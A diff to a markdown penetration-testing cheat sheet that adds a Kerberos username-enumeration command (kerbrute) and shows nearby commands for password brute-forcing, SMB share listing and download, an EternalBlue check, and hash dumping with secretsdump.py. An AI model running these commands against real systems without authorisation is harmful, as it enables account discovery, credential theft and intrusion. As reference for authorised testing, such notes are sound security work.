@@ -174,6 +174,16 @@ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Cr
 
 
 
+### Kerberos
+
+UDP/TCP port 88
+
+#### Username Enumeration
+
+```
+kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=$commonName $ListOfUsernames.txt
+```
+
 ### **POP3**
 
 TCP port 110
@@ -214,7 +224,6 @@ TCP port 445
 ```
 smbclient -L //$VICTIM/ # list shares
 smbclient -L //$VICTIM/ -p $PORT # specify non-standard SMB/Samba port
-
 ```
 
 Download files with smbclient
@@ -239,7 +248,7 @@ smbget -R smb://$VICTIM/$SHARE
 smbget -R smb://$VICTIM:$PORT/$SHARE
 ```
 
-
+#### Detect Vulnerabilities
 
 ```
 # check if vulnerable to EternalBlue
@@ -349,8 +358,6 @@ Dump hashes of other users if the user you have access to has the privilege's to
 ```
 python3 secretsdump.py  $DOMAIN/$USERNAME:$PASSWORD@$VICTIM
 ```
-
-****
 
 ### **IRC**
 
